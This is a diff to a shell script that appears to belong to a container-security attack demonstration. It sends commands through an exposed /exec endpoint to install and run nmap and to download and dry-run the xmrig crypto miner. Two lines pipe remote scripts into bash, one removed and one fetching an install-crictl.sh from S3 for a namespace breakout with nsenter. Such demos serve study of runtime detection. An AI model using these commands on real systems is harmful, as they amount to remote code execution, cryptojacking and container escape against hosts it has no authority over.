@@ -19,7 +19,9 @@ echo "3. Exploit installing nmap and running a scan"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
 
 echo "4. Exploit running a script to run a crypto miner"
-curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.18.1/xmrig --dry-run'
 
 echo "5. Break out of our namespace to the host's with nsenter and install crictl in /usr/bin"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl https://z9k65lokhn70.s3.amazonaws.com/install-crictl.sh | bash'
